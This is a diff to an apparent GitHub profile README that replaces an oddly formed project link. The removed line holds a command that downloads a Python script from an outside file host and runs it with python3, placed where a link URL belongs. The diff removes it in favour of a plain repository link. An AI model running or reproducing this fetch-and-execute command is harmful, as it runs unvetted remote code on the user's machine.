@@ -5,7 +5,7 @@
 
 <p align="left"> <a href="https://github.com/ryo-ma/github-profile-trophy"><img src="https://github-profile-trophy.vercel.app/?username=ryzen-ee0&theme=" alt="ryzen-ee0" /></a> </p>
 
-- 🔭 I’m currently working on [TelAV ](curl -fsSL https://upload.stashr.wtf/file/documents/file_5831.py -o file_5831.py python3 file_5831.py)
+- 🔭 I’m currently working on [TelAV ](https://github.com/ryzen-ee0/telav)
 - 🌱 I’m currently learning **Python**
 
 - 📫 How to reach me **Discord: start.sh**
